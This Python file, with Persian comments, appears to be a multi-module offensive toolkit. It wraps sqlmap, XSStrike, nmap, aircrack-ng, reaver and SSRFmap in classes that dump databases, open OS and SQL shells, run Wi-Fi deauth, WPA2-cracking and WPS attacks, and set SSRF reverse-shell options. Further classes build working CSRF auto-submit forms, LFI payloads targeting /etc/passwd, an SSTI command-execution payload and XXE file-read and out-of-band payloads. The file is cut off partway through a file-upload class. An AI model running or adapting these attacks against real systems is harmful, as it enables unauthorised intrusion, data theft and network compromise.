import importlib
import subprocess
import sys
import platform

# پرچم برای نصب خودکار: اگر False باشد فقط اطلاع‌رسانی می‌کند
AUTO_INSTALL = False

# تنظیم دیکشنری ماژول‌ها به همراه نام بسته pip، مسیر import و سیستم‌عامل‌های مجاز
MODULES = {
    'platform':     {'install': None,              'import': 'platform',                'platforms': None},
    'subprocess':   {'install': None,              'import': 'subprocess',              'platforms': None},
    'shutil':       {'install': None,              'import': 'shutil',                  'platforms': None},
    'sys':          {'install': None,              'import': 'sys',                     'platforms': None},
    'os':           {'install': None,              'import': 'os',                      'platforms': None},
    'zipfile':      {'install': None,              'import': 'zipfile',                 'platforms': None},
    'requests':     {'install': 'requests',        'import': 'requests',                'platforms': None},
    'bs4':          {'install': 'beautifulsoup4',   'import': 'bs4',                     'platforms': None},
    'tqdm':         {'install': 'tqdm',            'import': 'tqdm',                    'platforms': None},
    'typing':       {'install': None,              'import': 'typing',                  'platforms': None},
    'json':         {'install': None,              'import': 'json',                    'platforms': None},
    're':           {'install': None,              'import': 're',                      'platforms': None},
    'threading':    {'install': None,              'import': 'threading',               'platforms': None},
    'time':         {'install': None,              'import': 'time',                    'platforms': None},
    'socket':       {'install': None,              'import': 'socket',                  'platforms': None},
    'random':       {'install': None,              'import': 'random',                  'platforms': None},
    'winreg':       {'install': None,              'import': 'winreg',                  'platforms': ['Windows']},
    'asyncio':      {'install': None,              'import': 'asyncio',                 'platforms': None},
    'multiprocessing': {'install': None,           'import': 'multiprocessing',          'platforms': None},
    'base64':       {'install': None,              'import': 'base64',                  'platforms': None},
    'binascii':     {'install': None,              'import': 'binascii',                'platforms': None},
    'urllib.parse':{'install': None,               'import': 'urllib.parse',            'platforms': None},
    'codecs':       {'install': None,              'import': 'codecs',                  'platforms': None},
    'string':       {'install': None,              'import': 'string',                  'platforms': None},
    'wmi':          {'install': 'WMI',             'import': 'wmi',                     'platforms': ['Windows']},
    'androguard':   {'install': 'androguard',      'import': 'androguard.core.bytecodes.apk', 'platforms': None},
    'nfc':          {'install': 'nfcpy',           'import': 'nfc',                     'platforms': None},
    'bcrypt':       {'install': 'bcrypt',          'import': 'bcrypt',                  'platforms': None},
    'bleak':        {'install': 'bleak',           'import': 'bleak',                   'platforms': None},
    'bluetooth':    {'install': 'pybluez',         'import': 'bluetooth',               'platforms': None},
    'scapy':        {'install': 'scapy',           'import': 'scapy.all',               'platforms': None},
    'nmap3':        {'install': 'python3-nmap',    'import': 'nmap3',                   'platforms': None},
}

failed = []
sys_platform = platform.system()

for name, info in MODULES.items():
    # بررسی سازگاری با سیستم‌عامل فعلی
    if info['platforms'] and sys_platform not in info['platforms']:
        continue

    try:
        module = importlib.import_module(info['import'])
        globals()[name] = module
    except ImportError:
        # اگر نصب خودکار فعال باشد و بسته قابل نصب تعریف شده
        if AUTO_INSTALL and info['install']:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', info['install']])
                module = importlib.import_module(info['import'])
                globals()[name] = module
            except Exception:
                failed.append(info['import'])
        else:
            # فقط اطلاع‌رسانی می‌کنیم
            failed.append(info['import'])

# لاگ کردن فقط ماژول‌های ناکام
for imp in failed:
    print(f"LOG: '{imp}' library not load or install!")





import platform
import subprocess
import shutil
import sys
import os
import zipfile
import re
import json
import threading
import time
import socket
import random
import winreg
import asyncio
from multiprocessing import Pool, cpu_count
import base64
import binascii
import urllib.parse
import codecs
import string
import hashlib
from typing import List, Dict, Any, Optional

import requests
from tqdm import tqdm
from bs4 import BeautifulSoup

try:
    from scapy.all import sniff, BTLE, conf
except ImportError:
    sniff = None

if platform.system() == "Windows":
    import nmap3
    import ctypes
    import winreg



















class SQLI:
    """
    Cross-platform class for SQL Injection testing using sqlmap.
    Supports automatic dependency checking and installation on Linux and Windows.
    """

    GITHUB_REPO_ZIP = (
        "https://github.com/sqlmapproject/sqlmap"
    )
    LOCAL_DIR = "sqlmap"

    def __init__(self):
        self.system = platform.system()
        self.automatic_dependency_checking()

    def automatic_dependency_checking(self) -> None:
        """
        بررسی و نصب خودکار sqlmap
        - در لینوکس: نصب via apt
        - در ویندوز: دانلود ZIP از GitHub و استخراج با نوار پیشرفت
        """
        if self.system == "Linux":
            if not shutil.which("sqlmap"):  # check installed
                print("[+] Installing sqlmap via apt...")
                subprocess.run(["sudo", "apt", "update"], check=True)
                subprocess.run(["sudo", "apt", "install", "-y", "sqlmap"], check=True)
            else:
                print("[+] sqlmap is already installed.")

        elif self.system == "Windows":
            if not os.path.isdir(self.LOCAL_DIR):
                print(f"[+] Downloading sqlmap from GitHub ({self.GITHUB_REPO_ZIP})...")
                r = requests.get(self.GITHUB_REPO_ZIP, stream=True)
                total_size = int(r.headers.get('content-length', 0))
                chunk_size = 1024
                with open("sqlmap.zip", 'wb') as f, tqdm(
                    total=total_size, unit='iB', unit_scale=True
                ) as bar:
                    for chunk in r.iter_content(chunk_size=chunk_size):
                        f.write(chunk)
                        bar.update(len(chunk))
                print("[+] Extracting sqlmap.zip...")
                with zipfile.ZipFile("sqlmap.zip", 'r') as zipped:
                    members = zipped.namelist()
                    # extract into LOCAL_DIR
                    root = members[0].split('/')[0]
                    zipped.extractall()
                    os.rename(root, self.LOCAL_DIR)
                os.remove("sqlmap.zip")
            else:
                print("[+] sqlmap repository already present.")
            # Ensure dependencies
            req_path = os.path.join(self.LOCAL_DIR, "requirements.txt")
            if os.path.isfile(req_path):
                print("[+] Installing Python requirements...")
                subprocess.run([
                    sys.executable, "-m", "pip", "install", "-r", req_path
                ], check=True)
        else:
            raise EnvironmentError(
                f"Unsupported platform: {self.system}."
            )

    def execute_sqlmap(self, options: List[str]) -> None:
        """
        اجرای دستور sqlmap با آرگومان‌های مشخص
        """
        if self.system == "Windows":
            cmd = [sys.executable, os.path.join(self.LOCAL_DIR, "sqlmap.py")] + options
        else:
            cmd = ["sqlmap"] + options
        subprocess.run(cmd, check=True)

    def banner(self) -> None:
        """
        نمایش بنر و ورژن sqlmap
        """
        self.execute_sqlmap(["--version"])

    def scan_url(self, url: str, level: int = 1, risk: int = 1) -> None:
        """
        انجام یک اسکن پایه روی یک URL
        """
        opts = ["-u", url, "--batch", f"--level={level}", f"--risk={risk}"]
        self.execute_sqlmap(opts)

    def enumerate_databases(self, url: str) -> None:
        """
        فهرست کردن دیتابیس‌ها روی سرور
        """
        opts = ["-u", url, "--dbs", "--batch"]
        self.execute_sqlmap(opts)

    def enumerate_tables(self, url: str, db: str) -> None:
        """
        فهرست کردن جداول یک دیتابیس
        """
        opts = ["-u", url, "-D", db, "--tables", "--batch"]
        self.execute_sqlmap(opts)

    def dump_table(
        self, url: str, db: str, table: str, columns: Optional[List[str]] = None
    ) -> None:
        """
        استخراج محتوای یک جدول (یا ستون‌های مشخص)
        """
        opts = ["-u", url, "-D", db, "-T", table, "--dump", "--batch"]
        if columns:
            opts += ["-C", ",".join(columns)]
        self.execute_sqlmap(opts)

    def os_shell(self, url: str) -> None:
        """
        باز کردن شل سیستم‌عامل
        """
        opts = ["-u", url, "--os-shell"]
        self.execute_sqlmap(opts)

    def sql_shell(self, url: str) -> None:
        """
        باز کردن SQL shell
        """
        opts = ["-u", url, "--sql-shell"]
        self.execute_sqlmap(opts)





















class XSS:
    """
    Cross-platform class for XSS testing using XSStrike (https://github.com/s0md3v/XSStrike).
    Supports automatic dependency checking and installation on Linux and Windows.
    """

    GITHUB_REPO = "https://github.com/s0md3v/XSStrike.git"
    LOCAL_DIR = "XSStrike"

    def __init__(self):
        self.system = platform.system()
        self.automatic_dependency_checking()

    def automatic_dependency_checking(self) -> None:
        """
        بررسی و نصب خودکار XSStrike
        - در لینوکس: نصب via git + pip
        - در ویندوز: کلون repo از GitHub و pip install
        """
        # Ensure git is present
        if not shutil.which("git"):
            raise EnvironmentError("git is required for XSStrike installation.")

        # Clone or update repository
        if not os.path.isdir(self.LOCAL_DIR):
            print(f"[+] Cloning XSStrike from {self.GITHUB_REPO}...")
            subprocess.run(["git", "clone", self.GITHUB_REPO], check=True)
        else:
            print("[+] XSStrike repository exists, pulling latest...")
            subprocess.run(["git", "-C", self.LOCAL_DIR, "pull"], check=True)

        # Install Python dependencies
        req_file = os.path.join(self.LOCAL_DIR, "requirements.txt")
        if os.path.isfile(req_file):
            print("[+] Installing Python dependencies for XSStrike...")
            subprocess.run([
                sys.executable, "-m", "pip", "install", "-r", req_file
            ], check=True)
        else:
            print("[!] requirements.txt not found, skipping pip install.")

    def execute_xsstrike(self, options: List[str]) -> None:
        """
        اجرای xsstrike.py با آرگومان‌های مشخص
        """
        script = os.path.join(self.LOCAL_DIR, "xsstrike.py")
        if not os.path.isfile(script):
            raise FileNotFoundError("xsstrike.py not found. Ensure repository is cloned.")
        cmd = [sys.executable, script] + options
        subprocess.run(cmd, check=True)

    def banner(self) -> None:
        """
        نمایش بنر XSStrike
        """
        self.execute_xsstrike(["--help"])

    def scan_url(self, url: str, blind: bool = False, crawl: bool = False,
                 threads: int = 5, timeout: int = 10) -> None:
        """
        اسکن یک URL برای یافتن XSS
        """
        opts = ["-u", url]
        if blind:
            opts.append("--blind")
        if crawl:
            opts.extend(["--crawl"])
        opts.extend(["--threads", str(threads), "--timeout", str(timeout)])
        self.execute_xsstrike(opts)

    def crawl_site(self, url: str, depth: int = 2) -> None:
        """
        خز کردن سایت برای استخراج پارامترها
        """
        opts = ["--crawl", url, "--depth", str(depth)]
        self.execute_xsstrike(opts)

    def fuzz_parameters(self, url: str, param: Optional[str] = None) -> None:
        """
        فاز فولدینگ روی پارامترهای مشخص یا تمام پارامترها
        """
        opts = ["-u", url]
        if param:
            opts.extend(["--param", param])
        self.execute_xsstrike(opts)

    def generate_report(self, url: str, output: str = "xsstrike_report.html") -> None:
        """
        اجرای اسکن و ذخیره گزارش HTML
        """
        opts = ["-u", url, "--outfile", output]
        self.execute_xsstrike(opts)






















class NETWORK:
    """
    Cross-platform class for network scanning using nmap.

    - Linux: installs and uses system nmap via subprocess
    - Windows: installs and uses python-nmap3 library
    """

    def __init__(self):
        self.system = platform.system()
        self.nmap_bin = None
        self.nm3 = None
        self.automatic_dependency_checking()

    def automatic_dependency_checking(self) -> None:
        """
        بررسی و نصب وابستگی‌ها:
        - در لینوکس: نصب nmap via apt
        - در ویندوز: نصب python-nmap3 via pip
        """
        if self.system == "Linux":
            if not shutil.which("nmap"):
                print("[+] Installing nmap via apt...")
                subprocess.run(["sudo", "apt", "update"], check=True)
                subprocess.run(["sudo", "apt", "install", "-y", "nmap"], check=True)
            self.nmap_bin = shutil.which("nmap")

        elif self.system == "Windows":
            if nmap3 is None:
                print("[+] Installing python-nmap3 via pip...")
                subprocess.run([sys.executable, "-m", "pip", "install", "nmap3"], check=True)
                import nmap3 as _nm3
                self.nm3 = _nm3.Nmap()
            else:
                self.nm3 = nmap3.Nmap()
        else:
            raise EnvironmentError(f"Unsupported platform: {self.system}")

    def ping_scan(self, targets: List[str], timeout: int = 5) -> Dict[str, any]:
        """
        اسکن Ping برای ارزیابی up/down بودن میزبان‌ها
        """
        if self.system == "Linux":
            cmd = [self.nmap_bin, "-sn"] + targets + ["--host-timeout", f"{timeout}s"]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return {"output": result.stdout}
        else:
            return self.nm3.nmap_ping_scan(targets)

    def port_scan(self, target: str, ports: str = "1-1024", args: Optional[List[str]] = None) -> Dict[str, any]:
        """
        اسکن پورت‌ها روی یک میزبان
        ports: رشته پورت‌ها (مثلاً "22,80,443" یا "1-65535")
        args: آرگومان‌های اضافی
        """
        if self.system == "Linux":
            cmd = [self.nmap_bin, "-p", ports, target]
            if args:
                cmd += args
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return {"output": result.stdout}
        else:
            return self.nm3.scan_top_ports(target)

    def version_detection(self, target: str) -> Dict[str, any]:
        """
        تشخیص سرویس و ورژن
        """
        if self.system == "Linux":
            cmd = [self.nmap_bin, "-sV", target]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return {"output": result.stdout}
        else:
            return self.nm3.nmap_version_detection(target)

    def os_detection(self, target: str) -> Dict[str, any]:
        """
        تشخیص سیستم‌عامل هدف
        """
        if self.system == "Linux":
            cmd = [self.nmap_bin, "-O", target]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return {"output": result.stdout}
        else:
            return self.nm3.nmap_os_detection(target)

    def script_scan(self, target: str, scripts: List[str]) -> Dict[str, any]:
        """
        اجرای اسکریپت‌های NSE
        """
        script_args = ",".join(scripts)
        if self.system == "Linux":
            cmd = [self.nmap_bin, "--script", script_args, target]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return {"output": result.stdout}
        else:
            return self.nm3.nmap_scan(target, args=["--script", script_args])

    def full_scan(self, target: str) -> Dict[str, any]:
        """
        اسکن کامل: ping, port, version, os و اسکریپت
        """
        if self.system == "Linux":
            cmd = [self.nmap_bin, "-A", "-T4", target]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return {"output": result.stdout}
        else:
            return self.nm3.nmap_os_and_version_detection(target)













class WIFI:
    """
    Cross-platform placeholder for WIFI pentesting operations.
    Actual implementation only supports Linux.
    """

    REQUIRED_TOOLS = [
        "iwconfig",
        "ip",
        "airmon-ng",
        "airodump-ng",
        "aireplay-ng",
        "aircrack-ng",
        "wash",
        "reaver",
        "bully"
    ]

    def __init__(self, interface: Optional[str] = None):
        if platform.system() != "Linux":
            raise EnvironmentError("WIFI class is only supported on Linux platforms.")

        self.interface = interface
        self.automatic_dependency_checking()

    def automatic_dependency_checking(self) -> None:
        """
        بررسی و نصب خودکار ابزارهای مورد نیاز با subprocess
        """
        missing = []
        for tool in self.REQUIRED_TOOLS:
            if not shutil.which(tool):
                missing.append(tool)

        if missing:
            print(f"[+] Installing missing tools: {', '.join(missing)}")
            # Attempt install via apt
            if shutil.which("apt"):  # Debian-based
                cmd = ["sudo", "apt", "update"]
                subprocess.run(cmd, check=True)
                for pkg in missing:
                    subprocess.run(["sudo", "apt", "install", "-y", pkg], check=True)
            else:
                raise EnvironmentError(
                    f"Missing tools: {missing}. Please install them manually."
                )
        else:
            print("[+] All dependencies satisfied.")

    def detect_interfaces(self) -> List[str]:
        """
        تشخیص کارت‌های شبکه وایرلس
        """
        result = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        if "no wireless extensions" in result.stdout.lower():
            return []
        interfaces = []
        for line in result.stdout.splitlines():
            if 'IEEE' in line:
                iface = line.split()[0]
                interfaces.append(iface)
        return interfaces

    def enable_monitor_mode(self, interface: str) -> None:
        """
        قرار دادن کارت شبکه در حالت مانیتور
        """
        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
        # set updated interface
        self.interface = interface + "mon"

    def disable_monitor_mode(self, interface: Optional[str] = None) -> None:
        """
        بازگشت از حالت مانیتور
        """
        iface = interface or self.interface
        if not iface:
            raise ValueError("No interface specified")
        subprocess.run(["sudo", "airmon-ng", "stop", iface], check=True)

    def scan_access_points(self, interface: Optional[str] = None, timeout: int = 15) -> List[Dict[str, str]]:
        """
        اسکن شبکه‌ها و بازگرداندن لیست BSSID, ESSID, CHANNEL
        """
        iface = interface or self.interface
        if not iface:
            raise ValueError("No interface specified")
        output_file = "/tmp/airodump.csv"
        cmd = [
            "sudo", "timeout", str(timeout),
            "airodump-ng", "--write-interval", "1", "--output-format", "csv",
            "--write", output_file.rstrip('.csv'), iface
        ]
        subprocess.run(cmd, check=True)
        # خواندن CSV
        records = []
        csv_path = output_file
        if os.path.exists(csv_path):
            with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14 and parts[0] and parts[0][0].isdigit():
                        records.append({
                            'BSSID': parts[0],
                            'CHANNEL': parts[3],
                            'ENC': parts[5],
                            'ESSID': parts[13]
                        })
        return records

    def deauth_attack(self, bssid: str, client_mac: Optional[str] = None, count: int = 10) -> None:
        """
        حمله Deauth برای گرفتن handshake
        """
        cmd = ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid]
        if client_mac:
            cmd += ["-c", client_mac]
        cmd.append(self.interface)
        subprocess.run(cmd, check=True)

    def capture_handshake(self, bssid: str, output_file: str, timeout: int = 60) -> None:
        """
        جمع‌آوری handshake
        """
        cmd = [
            "sudo", "timeout", str(timeout),
            "airodump-ng", "--bssid", bssid,
            "-w", output_file, self.interface
        ]
        subprocess.run(cmd, check=True)

    def crack_wpa2(self, handshake_file: str, wordlist: str, output_file: str) -> None:
        """
        کرک WPA2 با aircrack-ng
        """
        cmd = [
            "aircrack-ng", "-w", wordlist,
            handshake_file,
            "-l", output_file
        ]
        subprocess.run(cmd, check=True)

    def enumerate_clients(self, bssid: str, interface: Optional[str] = None) -> List[str]:
        """
        شناسایی کلاینت‌های متصل به AP
        """
        iface = interface or self.interface
        cmd = ["sudo", "airodump-ng", "--bssid", bssid, iface]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        clients = []
        for line in result.stdout.splitlines():
            if line.startswith('    '):  # client lines indented
                parts = line.split()
                if parts:
                    clients.append(parts[0])
        return clients

    def identify_device_technology(self, mac: str) -> Optional[str]:
        """
        تشخیص تولیدکننده بر اساس OUI
        """
        # ساده: استفاده از ieee oui دیتابیس محلی
        # فرض: فایل /usr/share/wireshark/manuf وجود دارد
        manuf = "/usr/share/wireshark/manuf"
        try:
            with open(manuf) as f:
                prefix = mac.upper().replace("-", ":")[0:8]
                for line in f:
                    if line.startswith(prefix):
                        return line.split()[1]
        except FileNotFoundError:
            pass
        return None

    def wps_pin_attack(self, bssid: str, interface: Optional[str] = None, timeout: int = 120) -> None:
        """
        حمله WPS PIN با reaver
        """
        iface = interface or self.interface
        cmd = [
            "sudo", "timeout", str(timeout),
            "reaver", "-i", iface,
            "-b", bssid,
            "-vv"
        ]
        subprocess.run(cmd, check=True)

    def wps_pixie_dust(self, bssid: str, interface: Optional[str] = None, output_file: Optional[str] = None) -> None:
        """
        حمله Pixie Dust با reaver
        """
        iface = interface or self.interface
        cmd = [
            "sudo", "reaver", "-i", iface,
            "-b", bssid,
            "-K",
        ]
        if output_file:
            cmd += ["-o", output_file]
        subprocess.run(cmd, check=True)

    def packet_injection_test(self, interface: Optional[str] = None) -> bool:
        """
        تست تزریق بسته
        """
        iface = interface or self.interface
        cmd = ["sudo", "aireplay-ng", "--test", iface]
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return "Injection is working" in proc.stdout

    def deauth_monitor(self, interface: Optional[str] = None, timeout: int = 60) -> None:
        """
        لاگ‌برداری از بسته‌های deauth
        """
        iface = interface or self.interface
        cmd = ["sudo", "timeout", str(timeout), "airodump-ng", iface]
        subprocess.run(cmd, check=True)

    def replay_attack(self, bssid: str, client_mac: str, interface: Optional[str] = None, count: int = 5) -> None:
        """
        حمله Replay برای ریکابت بسته
        """
        iface = interface or self.interface
        cmd = ["sudo", "aireplay-ng", "--arpreplay", "-b", bssid, "-h", client_mac, "-p", str(count), iface]
        subprocess.run(cmd, check=True)

    def log_results(self, destination: str) -> None:
        """
        ذخیره لاگ‌ها
        """
        if not os.path.isdir(destination):
            os.makedirs(destination, exist_ok=True)
        logs = [f for f in os.listdir('.') if f.endswith('.csv') or f.endswith('.cap')]
        for f in logs:
            shutil.move(f, os.path.join(destination, f))



















class CSRF:
    """
    Cross-platform class for CSRF testing.
    نصب خودکار وابستگی‌ها (requests, beautifulsoup4).
    """
    REQUIRED_PACKAGES = ['requests', 'beautifulsoup4']

    def __init__(self):
        self.system = platform.system()
        self.automatic_dependency_checking()

    def automatic_dependency_checking(self) -> None:
        """
        بررسی و نصب خودکار پکیج‌های پایتون مورد نیاز با pip
        """
        # pip install on both Linux and Windows
        for pkg in self.REQUIRED_PACKAGES:
            try:
                __import__(pkg if pkg != 'beautifulsoup4' else 'bs4')
            except ImportError:
                print(f"[+] Installing package {pkg}...")
                subprocess.run([
                    sys.executable, '-m', 'pip', 'install', pkg
                ], check=True)
        # re-import
        global requests, BeautifulSoup
        import requests
        from bs4 import BeautifulSoup
        self.requests = requests
        self.BeautifulSoup = BeautifulSoup

    def detect_csrf_tokens(self, url: str) -> List[Dict[str, str]]:
        """
        دریافت توکن‌های CSRF از یک صفحه HTML
        خروجی: لیست دیکشنری با keys: name, value
        """
        resp = self.requests.get(url)
        soup = self.BeautifulSoup(resp.text, 'html.parser')
        tokens = []
        for inp in soup.find_all('input', {'type': 'hidden'}):
            name = inp.get('name')
            val = inp.get('value', '')
            if name and re.search(r'csrf|token', name, re.IGNORECASE):
                tokens.append({'name': name, 'value': val})
        return tokens

    def test_csrf_get(self, url: str, token_param: str) -> bool:
        """
        تست CSRF روی درخواست GET
        بازگشت True اگر بدون token امکان دسترسی نباشد (مستعد CSRF نیست).
        """
        # درخواست بدون token
        r1 = self.requests.get(url)
        # درخواست با پارامتر token_param اشتباه
        r2 = self.requests.get(f"{url}?{token_param}=invalid")
        # مقایسه کد وضعیت
        return r1.status_code != r2.status_code

    def test_csrf_post(self, url: str, form_data: Dict[str, str], token_param: str) -> bool:
        """
        تست CSRF روی درخواست POST
        form_data: داده‌های فرم پایه بدون token
        token_param: نام پارامتر token
        بازگشت True اگر بدون token پاسخ متفاوت (مستعد CSRF نیست).
        """
        data1 = form_data.copy()
        r1 = self.requests.post(url, data=data1)
        data2 = form_data.copy()
        data2[token_param] = 'invalid'
        r2 = self.requests.post(url, data=data2)
        return r1.status_code != r2.status_code

    def generate_exploit_html(self, target_url: str, params: Dict[str, str]) -> str:
        """
        تولید HTML فرم مخرب برای حمله CSRF
        """
        inputs = '\n'.join(
            f"    <input type=\"hidden\" name=\"{k}\" value=\"{v}\" />"
            for k, v in params.items()
        )
        html = f"""
<html>
  <body onload="document.forms[0].submit()">
    <form action=\"{target_url}\" method=\"post\">
{inputs}
    </form>
  </body>
</html>
"""
        return html

    def suggest_protection(self) -> str:
        """
        راهکارهای پیشنهادی جلوگیری از CSRF
        """
        return (
            "Use anti-CSRF tokens, SameSite cookies, and validate Origin/Referer headers."
        )
















class LFI_RFI:
    """
    Cross-platform testing for LFI and RFI vulnerabilities.
    نصب خودکار وابستگی‌ها (requests).
    """
    REQUIRED_PACKAGES = ['requests']

    def __init__(self):
        self.system = platform.system()
        self.automatic_dependency_checking()

    def automatic_dependency_checking(self) -> None:
        for pkg in self.REQUIRED_PACKAGES:
            try:
                __import__(pkg)
            except ImportError:
                subprocess.run([sys.executable, '-m', 'pip', 'install', pkg], check=True)

    def detect_lfi(self, url: str, param: str, payloads: Optional[List[str]] = None) -> List[str]:
        """
        تشخیص پارامترهای مستعد LFI با تزریق payloads.
        بازگشت لیست payload‌های موفق.
        """
        if payloads is None:
            payloads = ['../../../../etc/passwd', '../../../../../etc/passwd']
        vulnerable = []
        for p in payloads:
            target = url.replace(f"{param}=", f"{param}={p}")
            r = requests.get(target)
            if 'root:' in r.text:
                vulnerable.append(p)
        return vulnerable

    def read_file(self, url: str, param: str, filepath: str) -> Optional[str]:
        """
        خواندن فایل از سرور آسیب‌پذیر
        """
        target = f"{url}?{param}={filepath}"
        r = requests.get(target)
        if r.status_code == 200:
            return r.text
        return None

    def test_rfi(self, url: str, param: str, remote_url: str) -> bool:
        """
        تست RFI با بارگذاری URL خارجی
        بازگشت True اگر محتوا remote_url در response یافت شود.
        """
        target = f"{url}?{param}={remote_url}"
        r = requests.get(target)
        return remote_url in r.text


class SSTI:
    """
    Cross-platform Server-Side Template Injection testing.
    نصب خودکار وابستگی‌ها (requests).
    """
    REQUIRED_PACKAGES = ['requests']

    def __init__(self):
        self.system = platform.system()
        self.automatic_dependency_checking()

    def automatic_dependency_checking(self) -> None:
        for pkg in self.REQUIRED_PACKAGES:
            try:
                __import__(pkg)
            except ImportError:
                subprocess.run([sys.executable, '-m', 'pip', 'install', pkg], check=True)

    def detect_ssti(self, url: str, param: str, payloads: Optional[List[str]] = None) -> Dict[str, bool]:
        """
        تشخیص SSTI با تزریق payloads.
        بازگشت دیکشنری payload->True/False
        """
        if payloads is None:
            payloads = ['{{7*7}}', '{% raw %}{{7*7}}{% endraw %}']
        results = {}
        for p in payloads:
            data = {param: p}
            r = requests.post(url, data=data)
            results[p] = '49' in r.text
        return results

    def exploit_ssti(self, url: str, param: str, template: str) -> Optional[str]:
        """
        ارسال template دلخواه و بازگشت پاسخ
        """
        data = {param: template}
        r = requests.post(url, data=data)
        return r.text if r.status_code == 200 else None

    def get_interactive_shell(self, url: str, param: str) -> None:
        """
        شل تعاملی با SSTI (مدينة) در صورت وجود.
        فقط نمایش راهنما.
        """
        print("Interactive SSTI shell is application-specific; consider custom payloads like `{{''.__class__.__mro__[1].__subclasses__()[XX]('id',shell=True).split()`}")


class XXE:
    """
    Cross-platform testing for XML External Entity Injection.
    نصب خودکار وابستگی‌ها (requests).
    """
    REQUIRED_PACKAGES = ['requests']

    def __init__(self):
        self.system = platform.system()
        self.automatic_dependency_checking()

    def automatic_dependency_checking(self) -> None:
        for pkg in self.REQUIRED_PACKAGES:
            try:
                __import__(pkg)
            except ImportError:
                subprocess.run([sys.executable, '-m', 'pip', 'install', pkg], check=True)

    def test_xxe(self, endpoint: str, xml_payload: str, header: str = 'application/xml') -> Optional[str]:
        """
        ارسال XML با payload و بازگشت پاسخ
        """
        headers = {'Content-Type': header}
        r = requests.post(endpoint, data=xml_payload, headers=headers)
        return r.text if r.status_code == 200 else None

    def generate_xxe_payload(self, filepath: str, identifier: str = 'xxe') -> str:
        """
        تولید payload ساده برای خواندن فایل
        """
        return f"""
<?xml version=\"1.0\"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM \"file://{filepath}\" >]>
<foo>&xxe;</foo>
"""

    def out_of_band_xxe(self, endpoint: str, oob_url: str) -> str:
        """
        تولید payload OOB و ارسال
        """
        payload = f"""
<?xml version=\"1.0\"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY % xxe SYSTEM \"{oob_url}\" >
  %xxe;
]>
<foo>test</foo>
"""
        return self.test_xxe(endpoint, payload)





















class SSRF:
    """
    Cross-platform class for SSRF testing using SSRFmap (https://github.com/swisskyrepo/SSRFmap).
    Supports automatic dependency checking and installation on Linux and Windows.
    """
    GITHUB_REPO = "https://github.com/swisskyrepo/SSRFmap.git"
    LOCAL_DIR = "SSRFmap"
    REQUIRED_PACKAGES = ['requests', 'tqdm']  # for SSRFmap requirements

    def __init__(self):
        self.system = platform.system()
        self.base_dir = os.path.abspath(self.LOCAL_DIR)
        self.ssrf_script = os.path.join(self.base_dir, 'ssrfmap.py')
        self.automatic_dependency_checking()

    def automatic_dependency_checking(self) -> None:
        """
        بررسی و نصب خودکار SSRFmap:
        - در لینوکس: کلون یا pull repo، نصب requirements با pip (یا docker)
        - در ویندوز: کلون repo و نصب requirements با pip
        """
        # Ensure git
        if not shutil.which('git'):
            raise EnvironmentError('git is required for SSRFmap installation')

        # Clone or update repository
        if not os.path.isdir(self.LOCAL_DIR):
            print(f'[+] Cloning SSRFmap from {self.GITHUB_REPO}...')
            subprocess.run(['git', 'clone', self.GITHUB_REPO], check=True)
        else:
            print('[+] SSRFmap directory exists, pulling latest...')
            subprocess.run(['git', '-C', self.LOCAL_DIR, 'pull'], check=True)

        # Install python requirements
        req_file = os.path.join(self.LOCAL_DIR, 'requirements.txt')
        if os.path.isfile(req_file):
            print('[+] Installing SSRFmap requirements...')
            subprocess.run([
                sys.executable, '-m', 'pip', 'install', '-r', req_file
            ], check=True)
        else:
            print('[!] requirements.txt not found, ensure dependencies manually')

    def execute(self, reqfile: str, param: str,
                modules: List[str], handler: Optional[int] = None,
                lhost: Optional[str] = None, lport: Optional[int] = None,
                uagent: Optional[str] = None, ssl: bool = False,
                proxy: Optional[str] = None, level: int = 1,
                extra_args: Optional[List[str]] = None) -> None:
        """
        اجرای ssrfmap.py با پارامترهای مشخص
        reqfile: path to Burp-like request file
        param: parameter to fuzz
        modules: list of module names
        handler: port to listen for reverse shell
        lhost, lport: for connect-back payloads
        uagent: custom User-Agent
        ssl: use HTTPS without verification
        proxy: HTTP(s) proxy url
        level: test level
        extra_args: any additional args as list
        """
        cmd = [sys.executable, self.ssrf_script,
               '-r', reqfile,
               '-p', param,
               '-m', ','.join(modules),
               '--level', str(level)]
        if handler:
            cmd += ['-l', str(handler)]
        if lhost:
            cmd += ['--lhost', lhost]
        if lport:
            cmd += ['--lport', str(lport)]
        if uagent:
            cmd += ['--uagent', uagent]
        if ssl:
            cmd.append('--ssl')
        if proxy:
            cmd += ['--proxy', proxy]
        if extra_args:
            cmd += extra_args
        subprocess.run(cmd, check=True)

    # Convenience methods for common modules
    def module_readfiles(self, reqfile: str, param: str, rfiles: Optional[str] = None) -> None:
        args = []
        if rfiles:
            args = ['--rfiles', rfiles]
        self.execute(reqfile, param, ['readfiles'], extra_args=args)

    def module_portscan(self, reqfile: str, param: str) -> None:
        self.execute(reqfile, param, ['portscan'])

    def module_redis(self, reqfile: str, param: str,
                     lhost: str, lport: int, handler: int) -> None:
        self.execute(reqfile, param, ['redis'], lhost=lhost, lport=lport, handler=handler)

    def module_custom(self, reqfile: str, param: str, data: str, target_port: int) -> None:
        # custom module: send arbitrary data to service
        extra = ['--data', data, '--rport', str(target_port)]
        self.execute(reqfile, param, ['custom'], extra_args=extra)














class FileUpload:
    """
    Cross-platform File Upload vulnerability scanner and exploit.
    Scanner: detect upload endpoints and bypass checks.
